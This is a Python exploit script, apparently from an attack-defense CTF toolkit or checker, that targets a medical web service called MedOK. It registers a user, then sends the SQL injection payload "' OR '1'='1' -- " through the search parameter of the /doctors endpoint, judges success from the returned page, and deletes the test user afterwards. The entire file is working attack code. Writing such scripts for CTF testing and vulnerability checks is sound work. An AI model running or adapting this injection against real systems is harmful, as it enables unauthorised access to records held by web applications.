# Sploit (SQLI) for MedOK
# Author: boomgarang

import aiohttp
import asyncio
from colorama import Fore, Style
from .medok_sploit__helper import register_user, delete_user_from_db

async def sploit_sqli(HOST, PORT):
    register_resp = await register_user(HOST, PORT)
    if register_resp[0] != 101:
        return register_resp[0], None
    email, cookies = register_resp[1]
    try:
        async with aiohttp.ClientSession(cookies=cookies) as session:
            async with session.get(f'http://{HOST}:{PORT}/doctors', params={'search': "' OR '1'='1' -- "}) as response:
                if response.status == 200:
                    text_resp = await response.text()
                    delete_status = await delete_user_from_db(email, HOST)
                    if delete_status[0] != 101:
                        return delete_status
                    if "card-img-top doctor-image" in text_resp.lower():
                        print(Fore.GREEN + f"[+] Sploit 3 (Medok): {HOST}:{PORT} - SQLI exploit successful" + Style.RESET_ALL)
                        return 101, None
                    else:
                        print(Fore.RED + f"[-] Sploit 3 (Medok): {HOST}:{PORT} - SQLI exploit failed" + Style.RESET_ALL)
                        return 102, None
                else:
                    print(Fore.RED + f"[-] Sploit 3 (Medok): {HOST}:{PORT} - Connectivity error: {text_resp}" + Style.RESET_ALL)
                    await delete_user_from_db(email, HOST)
                    return 102, None
    except Exception as e:
        print(Fore.RED + f"[-] Sploit 3 (Medok): {HOST}:{PORT} - An error occurred: {e}" + Style.RESET_ALL)
        await delete_user_from_db(email, HOST)
        return 102, None

async def pwn(HOST):
    VERDICT = await sploit_sqli(HOST, 5000)
    print(VERDICT)
    return VERDICT

